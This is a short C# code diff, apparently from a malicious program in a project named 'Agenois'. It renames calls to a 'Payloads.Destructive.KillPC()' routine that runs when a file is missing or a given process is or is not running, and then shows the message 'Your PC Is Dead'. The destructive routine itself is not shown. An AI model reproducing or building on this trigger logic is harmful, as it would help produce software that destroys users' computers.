@@ -189,7 +189,7 @@ namespace Agenois.Utils
             {
                 if (File.Exists(file) == false)
                 {
-                    Destructive.KillPC();
+                    Payloads.Destructive.KillPC();
                     MessageBox.Show("Your PC Is Dead");
                 }
             }
@@ -203,7 +203,7 @@ namespace Agenois.Utils
                 Process[] proc = Process.GetProcessesByName(process);
                 if (proc.Length > 0)
                 {
-                    Destructive.KillPC();
+                    Payloads.Destructive.KillPC();
                     MessageBox.Show("Your PC Is Dead");
                 }
             }
@@ -214,7 +214,7 @@ namespace Agenois.Utils
                 if (proc.Length == 0)
                 {
                     //Not Running
-                    Destructive.KillPC();
+                    Payloads.Destructive.KillPC();
                     MessageBox.Show("Your PC Is Dead");
                 }
                 else
@@ -224,3 +224,4 @@ namespace Agenois.Utils
             }
         }
     }
+}
